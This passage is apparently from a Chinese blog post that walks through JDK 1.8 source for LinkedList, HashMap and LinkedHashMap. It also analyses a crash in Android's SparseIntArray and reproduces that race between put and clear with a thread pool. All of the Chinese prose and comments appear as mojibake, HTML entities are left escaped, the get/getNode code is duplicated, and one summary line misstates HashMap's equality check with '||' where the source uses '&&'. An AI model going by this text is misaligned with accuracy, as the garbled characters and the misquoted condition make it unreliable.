ã€‚æ‰€ä»¥LinkedListæ˜¯å¯ä»¥æ”¾è¿›å»ä¸€ä¸ªNullçš„ã€‚LinkedListå¾€å¾€è¢«äººè¯Ÿç—…çš„å°±æ˜¯é™¤äº†æ·»åŠ å’Œåˆ é™¤å¿«ä¹‹å¤–ï¼Œgetå’Œsetå¾ˆæ…¢ã€‚æ¥çœ‹ä¸‹addçš„å®ç°ï¼ˆjdk 1.8ï¼‰ public boolean add(E e) { linkLast(e); return true; } /** * Links e as last element. */ void linkLast(E e) { final Node&lt;E&gt; l = last; //å…ˆæŠŠé“¾è¡¨çš„å°¾å·´æ‰¾å‡ºæ¥ final Node&lt;E&gt; newNode = new Node&lt;&gt;(l, e, null); // å¯ä»¥æƒ³è±¡æ¯æ¬¡addéƒ½æœ‰newçš„æ“ä½œï¼Œå¹¶å°†åŸæ¥çš„å°¾å·´ä½œä¸ºè¿™ä¸ªæ–°çš„Entryçš„å¤´éƒ¨ last = newNode; //æ–°çš„Nodeå°†æˆä¸ºæ–°çš„å°¾å·´ if (l == null) //è¿™ç§æƒ…å†µæ˜¯åŸæ¥æ²¡æœ‰å°¾å·´ï¼Œä¹Ÿå°±æ˜¯è¯´size = 0 first = newNode; //è¿™æ—¶å€™å°±åªæœ‰ä¸€ä¸ªNodeï¼Œå¤´å’Œå°¾éƒ½æ˜¯Null else l.next = newNode; //ä¸ç„¶çš„è¯ï¼Œæ—§çš„å°¾å·´å˜æˆäº†å€’æ•°ç¬¬äºŒä¸ªï¼Œå®ƒçš„nextæŒ‡å‘äº†æ–°çš„Entry. size++; modCount++; } addçš„è¿‡ç¨‹çœ‹èµ·æ¥å¾ˆå¿«ï¼Œnewä¸€ä¸ªenteryï¼Œç¡®å®šä¸‹å‰åçš„æŒ‡é’ˆå°±å¯ä»¥äº†ã€‚removeä¹Ÿå·®ä¸å¤šï¼Œå–æ¶ˆæŒ‡é’ˆå¼•ç”¨å³å¯ã€‚ æ¥çœ‹æ¯”è¾ƒæ…¢çš„get public E get(int index) { checkElementIndex(index); return node(index).item; } /** * Returns the (non-null) Node at the specified element index. */ Node&lt;E&gt; node(int index) { // assert isElementIndex(index); if (index &lt; (size &gt;&gt; 1)) { Node&lt;E&gt; x = first; for (int i = 0; i &lt; index; i++) x = x.next; //ä¸€ç›´éå†åˆ°è¿™ä¸ªindexæ‰è¿”å›ï¼Œæ…¢ return x; } else { Node&lt;E&gt; x = last; for (int i = size - 1; i &gt; index; i--) x = x.prev; return x; } } å€¼å¾—æ³¨æ„çš„ä¸€ç‚¹å°äº‹ï¼šArrayList implement RandomAccessæ¥å£ï¼Œè€ŒLinkedListå¹¶æ²¡æœ‰ã€‚RandomAccessæ¥å£çš„å®šä¹‰å¦‚ä¸‹ Marker interface used by List implementations to indicate that they support fast (generally constant time) random access. The primary purpose of this interface is to allow generic algorithms to alter their behavior to provide good performance when applied to either random or sequential access lists.* The best algorithms for manipulating random access lists (such as ArrayList) can produce quadratic behavior when applied to sequential access lists (such as LinkedList). Generic list algorithms are encouraged to check whether the given list is an instanceof this interface before applying an algorithm that would provide poor performance if it were applied to a sequential access list, and to alter their behavior if necessary to guarantee acceptable performance.* It is recognized that the distinction between random and sequential access is often fuzzy. For example, some List implementations provide asymptotically linear access times if they get huge, but constant access times in practice. Such a List implementation should generally implement this interface. As a rule of thumb, a List implementation should implement this interface if, for typical instances of the class, this loop: for (int i=0, n=list.size(); i &lt; n; i++) list.get(i); //getçš„é€Ÿåº¦åº”è¯¥æ˜¯æ’å®šçš„ runs faster than this loop: for (Iterator i=list.iterator(); i.hasNext(); ) i.next(); è¿™ç§æ¥å£å°±æ˜¯ç»™å¤–ç•Œä½¿ç”¨è€…çœ‹çš„ï¼Œç”¨æ¥è¯´æ˜è¯¥é›†åˆæ”¯æŒè¿™ç§é€šè¿‡ä¸‹æ ‡æŸ¥æ‰¾ï¼ˆé€Ÿåº¦ä¸å˜ï¼‰çš„å¿«é€Ÿæ“ä½œ å®è·µè¡¨æ˜ï¼Œå¯¹äºlinkedListï¼Œé‡‡ç”¨for loopçš„æ–¹å¼è¦å¾ˆæ…¢ï¼Œä½†ä½¿ç”¨ListIteratorçš„æ–¹å¼ï¼Œé€Ÿåº¦å¹¶ä¸æ…¢ï¼Œç®€å•æ¥æƒ³ï¼Œæ²¿ç€é“¾è¡¨çš„ä¸€ä¸ªæ–¹å‘ä¸€è‡´å¾€ä¸‹èµ°å°±æ˜¯äº†å˜›ã€‚ä¸€äº›ç»éªŒè¡¨æ˜(æ‘˜è‡ªç®€ä¹¦ä½œè€…å˜Ÿçˆ·MDçš„æ–‡ç« ) ArryListå’ŒLinkedListçš„å¯¹æ¯”ç»“è®º 1ã€é¡ºåºæ’å…¥é€Ÿåº¦ArrayListä¼šæ¯”è¾ƒå¿«2ã€LinkedListå°†æ¯”ArrayListæ›´è€—è´¹ä¸€äº›å†…å­˜3ã€ArrayListçš„éå†æ•ˆç‡ä¼šæ¯”LinkedListçš„éå†æ•ˆç‡é«˜ä¸€äº›4ã€æœ‰äº›è¯´æ³•è®¤ä¸ºLinkedListåšæ’å…¥å’Œåˆ é™¤æ›´å¿«ï¼Œè¿™ç§è¯´æ³•å…¶å®æ˜¯ä¸å‡†ç¡®çš„ï¼šå¦‚æœå¢åŠ æˆ–è€…åˆ é™¤çš„å…ƒç´ åœ¨å‰åŠéƒ¨åˆ†çš„æ—¶å€™ï¼ŒArrayListä¼šé¢‘ç¹è°ƒç”¨System.arrayCopyæ–¹æ³•ï¼Œè™½ç„¶nativeæ–¹æ³•å¿«ï¼Œä½†é«˜é¢‘ç‡è°ƒç”¨è‚¯å®šæ…¢ï¼Œè‡³å°‘æ¯”ä¸ä¸Šç§»åŠ¨æŒ‡é’ˆã€‚ 2. Mapçš„å‡ ä¸ªå®ç°ç±»2.1 HashMapæºç è§£æ public class HashMap&lt;K,V&gt; extends AbstractMap&lt;K,V&gt; implements Map&lt;K,V&gt;, Cloneable, Serializable HashMapä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼ŒKeyå’ŒValueéƒ½æœ‰å¯èƒ½ä¸ºnullï¼Œå­˜å‚¨æ•°æ®ä¸æ˜¯æœ‰åºçš„(getçš„é¡ºåºä¸æ˜¯putçš„é¡ºåº)ã€‚æ¯”è¾ƒä¸“ä¸šçš„è¯´æ³•æ˜¯ é“¾è¡¨æ•°ç»„ç»“æ„ã€‚ HashMapä¸­æœ‰å‡ ä¸ªé»˜è®¤å€¼å¸¸é‡ é»˜è®¤åˆå§‹å®¹é‡æ˜¯16 static final int DEFAULT_INITIAL_CAPACITY = 1 &lt;&lt; 4; // aka 16 é»˜è®¤åŠ è½½å› å­æ˜¯0.75f ï¼ŒåŠ è½½å› å­æ˜¯æŒ‡Hashmapåœ¨è‡ªåŠ¨æ‰©å®¹ä¹‹å‰å¯ä»¥è¾¾åˆ°å¤šæ»¡ static final float DEFAULT_LOAD_FACTOR = 0.75f; //ä¸€èˆ¬ä¸éœ€è¦æ”¹ æ„é€ å‡½æ•°æœ‰å¥½å‡ ä¸ª public HashMap(int initialCapacity, float loadFactor) //è‡ªå®šä¹‰åŠ è½½å› å­ï¼Œæ¯”è¾ƒç„å­¦ public HashMap(int initialCapacity) // é¿å…æ‰©å®¹ï¼Œå’ŒArrayListåˆå§‹åŒ–æŒ‡å®šå®¹é‡ç±»ä¼¼çš„é“ç† public HashMap() //ç›´æ¥æŠŠåˆå§‹å®¹é‡è®¾ç½®æˆ16 public HashMap(Map&lt;? extends K, ? extends V&gt; m) æ³¨æ„è¿™ä¸ªåˆå§‹å®¹é‡å¿…é¡»æ˜¯2çš„næ¬¡æ–¹ ä¸»è¦æ˜¯ä¸ºäº†è®©indexFor(i)è¿™ä¸ªå‡½æ•°èƒ½å¤Ÿç›´æ¥ç”¨ä½è¿ç®—ï¼Œæ•ˆç‡é«˜ä¸€ç‚¹ æ¥çœ‹å¸¸è§çš„CURDæ“ä½œ(jdk 1.8æºç ï¼Œå’Œæˆ‘åœ¨ç½‘ä¸Šæ‰¾åˆ°çš„jdk1.6æºç æœ‰ä¸€äº›å˜åŒ–äº†) public V put(K key, V value) { return putVal(hash(key), key, value, false, true); //HashMapå…è®¸keyä¸ºnull,keyä¸ºnullçš„è¯ï¼Œç›´æ¥æ”¾åˆ°æ•°ç»„çš„0çš„ä½ç½®ï¼ˆhashæ–¹æ³•è¿”å›çš„æ˜¯0ï¼‰ } static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16); //å¦‚æœæ˜¯nullï¼Œæ”¾åˆ°æ•°ç»„çš„ç¬¬ä¸€ä¸ª // è¿™é‡Œé¢å°±æ˜¯HashMapç®—æ³•çš„é«˜æ˜ä¹‹å¤„ ï¼Œ // 1. é¦–å…ˆç®—å‡ºobjectçš„hashcodeï¼Œ //2.ç„¶åæ ¹æ®ä¸Šè¿°å…¬å¼å°†äºŒè¿›åˆ¶çš„1å°½é‡åˆ†æ•£çš„å‡åŒ€ä¸€ç‚¹ // 3. åœ¨putValçš„æ—¶å€™å°†è¿™ä¸ªå€¼è·Ÿæ•°ç»„çš„é•¿åº¦length-1è¿›è¡Œä½è¿ç®—ï¼Œå¾—åˆ°ä¸€ä¸ªæ¯”lengthå°çš„æ­£æ•°ï¼Œä½œä¸ºè¿™ä¸ªæ–°å…ƒç´ åœ¨æ•°ç»„ä¸­çš„index.ä½†è¿™æ ·ä»ä¸å…ä¼šäº§ç”Ÿå†²çª(hash Collision) } /** * Implements Map.put and related methods * * @param hash hash for key * @param key the key * @param value the value to put * @param onlyIfAbsent if true, don&#39;t change existing value * @param evict if false, the table is in creation mode. * @return previous value, or null if none */ final V putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict) { Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i; if ((tab = table) == null || (n = tab.length) == 0) n = (tab = resize()).length; //tableä¸ºæˆå‘˜å˜é‡ï¼Œæ˜¯ä¸€ä¸ªNodeæ•°ç»„ï¼Œä¸ºç©ºçš„è¯åˆ™åˆ›å»º ã€‚åœ¨resizeä¸­åˆ›å»º if ((p = tab[i = (n - 1) &amp; hash]) == null) tab[i] = newNode(hash, key, value, null); else { Node&lt;K,V&gt; e; K k; if (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != null &amp;&amp; key.equals(k)))) e = p; //Tableæ•°ç»„ä¸­æ‰¾åˆ°äº†è¿™ä¸ªä¸‹æ ‡çš„å…ƒç´ ï¼Œç›´æ¥æŒ‡å®š else if (p instanceof TreeNode)//på¯ä»¥ç†è§£ä¸ºprevious ã€‚ å¦‚æœå‘ç°è¿™ä¸ªèŠ‚ç‚¹æ˜¯ä¸€æ£µæ ‘ï¼ˆçº¢é»‘æ ‘ï¼Ÿï¼‰ e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value); else {//å¦åˆ™è¯¥èŠ‚ç‚¹æ˜¯é“¾è¡¨ï¼Œå„ä¸ªå…ƒç´ ä¹‹é—´æ‰‹æ‹‰æ‰‹çš„é‚£ç§ for (int binCount = 0; ; ++binCount) { if ((e = p.next) == null) { p.next = newNode(hash, key, value, null); //æ‰¾åˆ°è¿™ä¸ªé“¾è¡¨çš„å°¾å·´äº† if (binCount &gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st treeifyBin(tab, hash); break; } if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) break; p = e; } } if (e != null) { // existing mapping for key V oldValue = e.value; if (!onlyIfAbsent || oldValue == null) e.value = value; afterNodeAccess(e); //å›è°ƒå‡½æ•° return oldValue; } } ++modCount; if (++size &gt; threshold) resize(); afterNodeInsertion(evict);//å›è°ƒå‡½æ•° return null; } getæ–¹æ³• public V get(Object key) { Node&lt;K,V&gt; e; return (e = getNode(hash(key), key)) == null ? null : e.value;//æ ¹æ®keyæ¥æ‰¾value } /** * Implements Map.get and related methods * * @param hash hash for key * @param key the key * @return the node, or null if none */ final Node&lt;K,V&gt; getNode(int hash, Object key) { Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; first, e; int n; K k; if ((tab = table) != null &amp;&amp; (n = tab.length) &gt; 0 &amp;&amp; (first = tab[(n - 1) &amp; hash]) != null) { //tableä¸ä¸ºç©ºè¯´æ˜æ›¾ç»putè¿‡ if (first.hash == hash &amp;&amp; // always check first node ((k = first.key) == key || (key != null &amp;&amp; key.equals(k)))) return first; if ((e = first.next) != null) { if (first instanceof TreeNode) return ((TreeNode&lt;K,V&gt;)first).getTreeNode(hash, key); do { if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) return e; } while ((e = e.next) != null); } } return null; } public V get(Object key) { Node&lt;K,V&gt; e; return (e = getNode(hash(key), key)) == null ? null : e.value; } /** * Implements Map.get and related methods * * @param hash hash for key * @param key the key * @return the node, or null if none */ final Node&lt;K,V&gt; getNode(int hash, Object key) { Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; first, e; int n; K k; if ((tab = table) != null &amp;&amp; (n = tab.length) &gt; 0 &amp;&amp; (first = tab[(n - 1) &amp; hash]) != null) { if (first.hash == hash &amp;&amp; // always check first node ((k = first.key) == key || (key != null &amp;&amp; key.equals(k)))) return first; if ((e = first.next) != null) { if (first instanceof TreeNode) return ((TreeNode&lt;K,V&gt;)first).getTreeNode(hash, key); do { if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) return e; //å¯ä»¥çœ‹å‡ºæ¯”è¾ƒçš„æ–¹å¼å°±æ˜¯hashï¼ˆintï¼‰ç›¸ç­‰ä¸”key(æŒ‡é’ˆç›¸ç­‰) æˆ–è€…key equals(æ‰€ä»¥ç»å¸¸è¯´é‡å†™equalséœ€è¦ç¡®ä¿hashcodeä¸€è‡´ï¼Œè¿™é‡Œè‡³å°‘ååº”äº†è¿™ä¸€ç‚¹) } while ((e = e.next) != null); } } return null; } å›æƒ³ä¸€ä¸‹å¹³æ—¶è¿­ä»£ä¸€ä¸ªHashMapçš„æ–¹å¼ long i = 0; Iterator&lt;Map.Entry&lt;Integer, Integer&gt;&gt; it = map.entrySet().iterator(); while (it.hasNext()) { Map.Entry&lt;Integer, Integer&gt; pair = it.next(); //ä¸Šé¢çš„getä¹Ÿæ˜¯è¿™ç§ä¸æ–­æŸ¥æ‰¾nextçš„æ–¹å¼ i += pair.getKey() + pair.getValue(); } entrySetæ–¹æ³•æ˜¯Mapæ¥å£å®šä¹‰çš„ Set&lt;Map.Entry&lt;K, V&gt;&gt; entrySet(); * Returns a Set view of the mappings contained in this map. * The set is backed by the map, so changes to the map are * reflected in the set, and vice-versa. If the map is modified * while an iteration over the set is in progress (except through * the iterator&#39;s own &lt;tt&gt;remove&lt;/tt&gt; operation, or through the * &lt;tt&gt;setValue&lt;/tt&gt; operation on a map entry returned by the * iterator) the results of the iteration are undefined. The set * supports element removal, which removes the corresponding * mapping from the map, via the &lt;tt&gt;Iterator.remove&lt;/tt&gt;, * &lt;tt&gt;Set.remove&lt;/tt&gt;, &lt;tt&gt;removeAll&lt;/tt&gt;, &lt;tt&gt;retainAll&lt;/tt&gt; and * &lt;tt&gt;clear&lt;/tt&gt; operations. It does not support the * &lt;tt&gt;add&lt;/tt&gt; or &lt;tt&gt;addAll&lt;/tt&gt; operations. * * @return a set view of the mappings contained in this map å¤§è‡´æ„æ€æ˜¯ï¼š è¿”å›ä¸€ä¸ªèƒ½å¤Ÿåæ˜ è¯¥mapå…ƒç´ ç»„åˆçš„ä¸€ä¸ªSetï¼Œå¯¹è¿™ä¸ªSetçš„æ“ä½œéƒ½å°†åæ˜ åˆ°åŸmapä¸Šï¼Œåä¹‹äº¦ç„¶ã€‚åœ¨é€šè¿‡entrySetè¿­ä»£è¿™ä¸ªmapçš„æ—¶å€™ï¼Œé™¤äº†removeå’Œæ“ä½œæ“ä½œéƒ½æ˜¯ä¸è¢«æ”¯æŒçš„ã€‚è¿”å›çš„Setæ”¯æŒåˆ é™¤å¯¹åº”çš„mappingç»„åˆã€‚ä½†ä¸æ”¯æŒaddæ“ä½œ HashMapå†…éƒ¨ä¿ç•™äº†ä¸€ä¸ªè¿™æ ·çš„æˆå‘˜å˜é‡ï¼štransient Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet; //æˆå‘˜å˜é‡å…·ä½“å®ç°enterySetæ–¹æ³•çš„åœ°æ–¹ï¼š public Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet() { Set&lt;Map.Entry&lt;K,V&gt;&gt; es; return (es = entrySet) == null ? (entrySet = new EntrySet()) : es; } // è¿™ä¸ªEntrySetå¤§è‡´é•¿è¿™æ · final class EntrySet extends AbstractSet&lt;Map.Entry&lt;K,V&gt;&gt; { public final int size() { return size; } public final void clear() { HashMap.this.clear(); } public final Iterator&lt;Map.Entry&lt;K,V&gt;&gt; iterator() { return new EntryIterator(); } public final boolean contains(Object o) { if (!(o instanceof Map.Entry)) return false; Map.Entry&lt;?,?&gt; e = (Map.Entry&lt;?,?&gt;) o; Object key = e.getKey(); Node&lt;K,V&gt; candidate = getNode(hash(key), key); return candidate != null &amp;&amp; candidate.equals(e); } public final boolean remove(Object o) { if (o instanceof Map.Entry) { Map.Entry&lt;?,?&gt; e = (Map.Entry&lt;?,?&gt;) o; Object key = e.getKey(); Object value = e.getValue(); return removeNode(hash(key), key, value, true, true) != null; } return false; } } æ•´ç†çš„å…³é”®åœ¨äºremoveNodeæ–¹æ³•ï¼Œå’ŒgetNodeå’ŒputValå¾ˆåƒ final Node&lt;K,V&gt; removeNode(int hash, Object key, Object value, boolean matchValue, boolean movable) { Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, index; if ((tab = table) != null &amp;&amp; (n = tab.length) &gt; 0 &amp;&amp; (p = tab[index = (n - 1) &amp; hash]) != null) { Node&lt;K,V&gt; node = null, e; K k; V v; if (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != null &amp;&amp; key.equals(k)))) node = p; else if ((e = p.next) != null) { if (p instanceof TreeNode) node = ((TreeNode&lt;K,V&gt;)p).getTreeNode(hash, key); else { do { if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) { node = e; break; } p = e; } while ((e = e.next) != null); } } //å…ˆæŠŠp(previous)æ‰¾å‡ºæ¥ï¼Œè¿™é‡Œçš„matchValueå’Œmovableéƒ½æ˜¯true // node å°±æ˜¯åŒ…å«äº†è¦ç§»å‡ºå¯¹è±¡çš„Node if (node != null &amp;&amp; (!matchValue || (v = node.value) == value || (value != null &amp;&amp; value.equals(v)))) { if (node instanceof TreeNode) ((TreeNode&lt;K,V&gt;)node).removeTreeNode(this, tab, movable); else if (node == p) //æ•°ç»„è¿™ä¸ªä½ç½®å°±ä¸€ä¸ª tab[index] = node.next;//ç›´æ¥æŒ‡å‘ä¸‹ä¸€ä¸ª else p.next = node.next; //æ•°ç»„è¿™ä¸ªä½ç½®æŒ‡å‘é“¾è¡¨ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼Œé‡Šæ”¾å¼•ç”¨ ++modCount; --size; afterNodeRemoval(node); return node; } } return null; } æ¯”è¾ƒå…ƒç´ æ˜¯å¦ç›¸åŒçš„å…³é”®æ˜¯ e.hash == hash || (key!=null &amp;&amp;key.equals(k)) //ååŠéƒ¨åˆ†å…¶å®ä¹Ÿæ˜¯æ¯”è¾ƒhashCode å¦å¤–ä¸€äº›å¹³æ—¶å¸¸ç”¨çš„æ–¹æ³•åŒ…æ‹¬ï¼š public boolean containsKey(Object key) { return getNode(hash(key), key) != null; //å°±æ˜¯æ£€æŸ¥ä¸‹æœ‰æ²¡æœ‰è¿™ä¸ªkeyå¯¹åº”çš„Node } public boolean containsValue(Object value) { Node&lt;K,V&gt;[] tab; V v; if ((tab = table) != null &amp;&amp; size &gt; 0) { for (int i = 0; i &lt; tab.length; ++i) { for (Node&lt;K,V&gt; e = tab[i]; e != null; e = e.next) { if ((v = e.value) == value || (value != null &amp;&amp; value.equals(v))) return true; //éå†å†…éƒ¨çš„æ•°ç»„ï¼Œä»…æ­¤è€Œå·² } } } return false; } å’ŒArrayListã€LinkedListæ¯”èµ·æ¥ï¼ŒHashMapçš„æºç è¦éº»çƒ¦è®¸å¤šï¼Œè¿™é‡Œé¢æ¶‰åŠåˆ°hashCodeï¼Œé“¾è¡¨ï¼Œçº¢é»‘æ ‘ã€‚éœ€è¦ä¸€ç‚¹æ•°æ®ç»“æ„çš„çŸ¥è¯†ã€‚å¦å¤–ï¼ŒHashMapè¿˜é’ˆå¯¹hashCodeå†²çªï¼ˆhash Collisionï¼Œä¸åŒçš„Objectå±…ç„¶æœ‰ç›¸åŒçš„hashCodeï¼‰çš„æƒ…å†µä½œäº†é¢„å¤„ç†é€šä¿—çš„æ¥è¯´ï¼ŒHashMapå†…éƒ¨ç»´æŠ¤äº†ä¸€ä¸ªæ•°ç»„ï¼Œæ¯ä¸€ä¸ªæ•°ç»„å…ƒç´ å†…éƒ¨ä¸ä¸€å®šåªæœ‰ä¸€ä¸ªï¼Œæœ‰å¯èƒ½æ˜¯ä¸€ä¸ªé“¾è¡¨ã€‚æ¯æ¬¡æ·»åŠ (key,value)ä¸æ˜¯ç›²ç›®çš„å¾€è¿™ä¸ªæ•°ç»„é‡Œé¢å¡ï¼Œè€Œæ˜¯ç®—ä¸‹keyçš„hashå€¼ï¼Œæ”¾åˆ°å¯¹åº”çš„èŠ‚ç‚¹ä¸Šã€‚å¦‚æœè¿™ä¸ªèŠ‚ç‚¹ä¸Šè¿˜æ²¡æœ‰å…ƒç´ ï¼Œç›´æ¥æ”¾å°±å¥½äº†ã€‚å¦‚æœæœ‰çš„è¯ï¼Œæ–°åŠ å…¥çš„valueå°†è¢«ä½œä¸ºåŸæœ‰å…ƒç´ çš„Next(å¤–éƒ¨è°ƒç”¨getçš„æ—¶å€™ï¼Œå…ˆæ ¹æ®ä¼ å…¥çš„keyçš„hashCodeæ‰¾åˆ°èŠ‚ç‚¹ï¼Œç„¶åæ ¹æ®key.equalsæ¥æ‰¾)ã€‚ç®€å•å¦‚æ­¤ï¼Œç²¾è‡´å¦‚æ–¯ã€‚ 2.2 LinkedHashMappublic class LinkedHashMap&lt;K,V&gt; extends HashMap&lt;K,V&gt; implements Map&lt;K,V&gt;HashMapæºç æˆ‘çœ‹äº†ä¸‹æœ‰ä¸¤åƒå¤šè¡Œï¼ŒLinkedHashMapåªæœ‰ä¸ƒç™¾å¤šè¡Œï¼Œæ˜¾ç„¶è¿™æ˜¯ç»§æ‰¿å¸¦æ¥çš„ç®€ä¾¿ä¹‹å¤„ã€‚å…³é”®çš„æˆå‘˜å˜é‡final boolean accessOrder; é»˜è®¤æ˜¯false The iteration ordering method for this linked hash map: truefor access-order, false for insertion-order. LinkedHashMapå¸¸ç”¨çš„å±æ€§å°±æ˜¯å®ƒæ”¯æŒæœ‰åºï¼Œè¿™ä¸ªæœ‰åºæ˜¯æŒ‡è¿­ä»£çš„æ—¶å€™æœ‰åºHashMapç”¨æ¥å­˜æ”¾å’Œè·å–å¯¹è±¡ï¼Œè€ŒåŒå‘é“¾è¡¨ç”¨æ¥å®ç°æœ‰åº 2.3 SparseArrayå…ˆæ¥çœ‹ä¸€æ®µå´©æºƒæ—¥å¿— Fatal Exception: java.lang.ArrayIndexOutOfBoundsException: src.length=509 srcPos=60 dst.length=509 dstPos=61 length=-60 at java.lang.System.arraycopy(System.java:388) at com.android.internal.util.GrowingArrayUtils.insert(GrowingArrayUtils.java:135) at android.util.SparseIntArray.put(SparseIntArray.java:144) ç®€å•åˆ†æä¸€ä¸‹ï¼Œ GrowingArrayUtils.java /** * Primitive int version of {@link #insert(Object[], int, int, Object)}. */ public static int[] insert(int[] array, int currentSize, int index, int element) { assert currentSize &lt;= array.length; if (currentSize + 1 &lt;= array.length) { System.arraycopy(array, index, array, index + 1, currentSize -index); array[index] = element; return array; } int[] newArray = new int[growSize(currentSize)]; System.arraycopy(array, 0, newArray, 0, index); newArray[index] = element; System.arraycopy(array, index, newArray, index + 1, array.length - index); return newArray; } public static void arraycopy(int[] src, int srcPos, int[] dst, int dstPos, int length) { if (src == null) { throw new NullPointerException(&quot;src == null&quot;); } if (dst == null) { throw new NullPointerException(&quot;dst == null&quot;); } if (srcPos &lt; 0 || dstPos &lt; 0 || length &lt; 0 || srcPos &gt; src.length - length || dstPos &gt; dst.length - length) { throw new ArrayIndexOutOfBoundsException( &quot;src.length=&quot; + src.length + &quot; srcPos=&quot; + srcPos + &quot; dst.length=&quot; + dst.length + &quot; dstPos=&quot; + dstPos + &quot; length=&quot; + length); //å¯¹ç…§ç€å´©æºƒæ—¥å¿—ï¼Œlengthä¼ äº†ä¸ª-60è¿›æ¥ï¼Œè€ŒsrcPos = 60ã€‚æ˜¾ç„¶æ˜¯æœ‰å…¶ä»–çº¿ç¨‹åœ¨SparseArray.putè°ƒç”¨åï¼Œåœ¨GrowingArrayUtils.insertè°ƒç”¨å‰åšäº†ä¸€æ¬¡clearæ“ä½œã€‚æ€ä¹ˆåŠï¼ŒåŠ é”å‘—ã€‚ } } å¾ˆæ˜¾ç„¶è¿™æ®µè¯æ˜¯å› ä¸ºlength= -60å¯¼è‡´å´©æºƒï¼Œåº”è¯¥æ˜¯mSizeè¢«è®¾ç½®ä¸º0(å…¶ä»–çº¿ç¨‹è°ƒç”¨äº†clearæ–¹æ³•ï¼Œclearåªæ˜¯è®¾ç½®mSize = 0) é‡ç°äº†ä¸€ä¸‹ï¼š @Override public void onClick(View v) { executor = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors()); for (int i = 0; i &lt; 1000; i++) { if (i %2==0) { executor.execute(new closer(sparseIntArray)); continue; } executor.execute(new writer(sparseIntArray, i)); } } static class writer implements Runnable { SparseIntArray array; int index; public writer(SparseIntArray array, int index) { this.array = array; this.index = index; } @Override public void run() { array.put(index, (int) Thread.currentThread().getId()); LogUtil.p(&quot;write to &quot;+index); } } static class closer implements Runnable { SparseIntArray array; public closer(SparseIntArray array) { this.array = array; } @Override public void run() { array.clear(); LogUtil.e(&quot;clear array&quot;); } } æœç„¶: 08-21 15:26:27.600 23165-23207/com.harris.simplezhihu E/AndroidRuntime: FATAL EXCEPTION: pool-1-thread-4 Process: com.harris.simplezhihu, PID: 23165 java.lang.ArrayIndexOutOfBoundsException: src.length=21 srcPos=1 dst.length=21 dstPos=2 length=-1 at java.lang.System.arraycopy(System.java:388) at com.android.internal.util.GrowingArrayUtils.insert(GrowingArrayUtils.java:135) at android.util.SparseIntArray.put(SparseIntArray.java:143) at com.harris.simplezhihu._07_sparsearry_concurrent.SpareArrayCrashActivity$writer.run(SpareArrayCrashActivity.java:61) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1113) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:588) at java.lang.Thread.run(Thread.java:818) SparseArryæä¾›äº†ç±»ä¼¼äºHashMapçš„è°ƒç”¨æ¥å£ï¼Œ ä½¿ç”¨SparseArrayçš„åˆè¡·è¿˜æ˜¯åœ¨androidè¿™ç§å†…å­˜æ¯”cpué‡‘è´µçš„å¹³å°ä¸­ï¼Œä½¿ç”¨SparseArryç›¸æ¯”HashMapèƒ½å¤Ÿå‡è½»å†…å­˜å‹åŠ›ï¼Œè·å¾—æ›´å¥½çš„æ€§èƒ½ã€‚liaohuqiuæŒ‡å‡ºSparseArryå¹¶ä¸æ˜¯ä»»ä½•æ—¶å€™éƒ½æ›´å¿«ï¼Œä¸»è¦æ˜¯èŠ‚çœå†…å­˜ï¼Œé¿å…autoBoxingï¼ŒäºŒåˆ†æ³•æŸ¥æ‰¾å¯¹äºcpuçš„æ¶ˆè€—éœ€è¦æƒè¡¡ã€‚å°¤å…¶æ˜¯å­˜å‚¨çš„é‡å¾ˆå¤§çš„æ—¶å€™ï¼ŒäºŒåˆ†æ³•æŸ¥æ‰¾çš„é€Ÿåº¦ä¼šå¾ˆæ…¢ã€‚ SparseArryç±»ä¼¼çš„classæœ‰å¥½å‡ ä¸ªï¼Œæ®è¯´æœ‰å…«ä¸ªï¼Œä»¥SparseIntArryä¸ºä¾‹SparseIntArryçš„å‡ ä¸ªå¸¸ç”¨æ–¹æ³•,å€¼å¾—æ³¨æ„çš„æ˜¯ clearæ–¹æ³•åªä¸è¿‡æ˜¯æŠŠmSizeè®¾ç½®ä¸º0ã€‚remove(key)åªæ˜¯æŠŠè¿™ä¸ªkeyå¯¹åº”ä½ç½®valueè®¾ç½®ä¸ºDELETED.å†…éƒ¨çš„mKeysæ˜¯æœ‰åºçš„int[],long[]ã€‚è¿™æ ·æ‰èƒ½å®ç°äºŒåˆ†æ³•æŸ¥æ‰¾ã€‚ public int indexOfKey(int key) public int indexOfValue(int value) public int get(int key) public void put(int key, int value) public void clear() { mSize = 0; } //è¿­ä»£ä¸€ä¸ªSparseArryçš„æ–¹æ³• for(int i = 0; i &lt; sparseArray.size(); i++) { int key = sparseArray.keyAt(i); // get the object by the key. Object obj = sparseArray.get(key); } // ä»æºç æ¥çœ‹å˜é‡ç»“æ„ public class SparseIntArray implements Cloneable{ private int[] mKeys; private int[] mValues; private int mSize; } public void put(int key, int value) { int i = ContainerHelpers.binarySearch(mKeys, mSize, key); //äºŒåˆ†æ³•æŸ¥æ‰¾ if (i &gt;= 0) { mValues[i] = value; //æ‰¾åˆ°äº†åœ¨Valueæ•°ç»„ä¸­çš„index,ç›´æ¥æ›¿æ¢æ‰ } else { i = ~i; mKeys = GrowingArrayUtils.insert(mKeys, mSize, i, key); mValues = 